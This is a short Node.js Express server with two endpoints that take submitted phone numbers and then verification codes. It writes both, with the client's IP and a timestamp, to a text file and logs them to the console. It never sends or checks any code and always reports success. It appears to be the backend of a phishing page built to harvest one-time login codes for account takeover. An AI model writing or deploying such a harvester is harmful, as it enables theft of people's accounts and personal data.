const express = require('express');
const cors = require('cors');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

app.post('/api/phone', (req, res) => {
    const { phone } = req.body;
    if (!phone || phone.length < 10) {
        return res.status(400).json({ error: 'Invalid phone' });
    }
    const data = { phone, ip: req.ip, time: new Date().toISOString() };
    fs.appendFileSync('data.txt', JSON.stringify(data) + '\n');
    console.log('📱 Phone:', phone);
    res.json({ success: true });
});

app.post('/api/verify', (req, res) => {
    const { phone, code } = req.body;
    if (!phone || !code || code.length < 5) {
        return res.status(400).json({ error: 'Invalid data' });
    }
    const data = { phone, code, ip: req.ip, time: new Date().toISOString() };
    fs.appendFileSync('data.txt', JSON.stringify(data) + '\n');
    console.log('🔑 Phone + Code:', phone, code);
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log('✅ Server running on port ' + PORT);
});